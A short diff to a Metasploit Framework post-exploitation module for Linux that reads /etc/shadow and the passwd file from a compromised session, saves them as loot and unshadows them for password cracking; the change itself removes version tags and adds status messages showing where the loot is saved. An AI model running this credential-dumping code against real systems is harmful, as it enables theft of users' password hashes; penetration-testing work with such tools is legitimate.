@@ -1,6 +1,3 @@
-# $Id$
-##
-
 ##
 # ## This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
@@ -27,7 +24,6 @@ class Metasploit3 < Msf::Post
 				'Description'   => %q{ Post Module to dump the password hashes for all users on a Linux System},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-				'Version'       => '$Revision$',
 				'Platform'      => [ 'linux' ],
 				'SessionTypes'  => [ 'shell' ]
 			))
@@ -41,8 +37,10 @@ class Metasploit3 < Msf::Post
 			shadow_file = read_file("/etc/shadow")
 
 			# Save in loot the passwd and shadow file
-			store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
-			store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
+			p1 = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
+			p2 = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
+			vprint_status("Shadow saved in: #{p1.to_s}")
+			vprint_status("passwd saved in: #{p2.to_s}")
 
 			# Unshadow the files
 			john_file = unshadow(passwd_file, shadow_file)
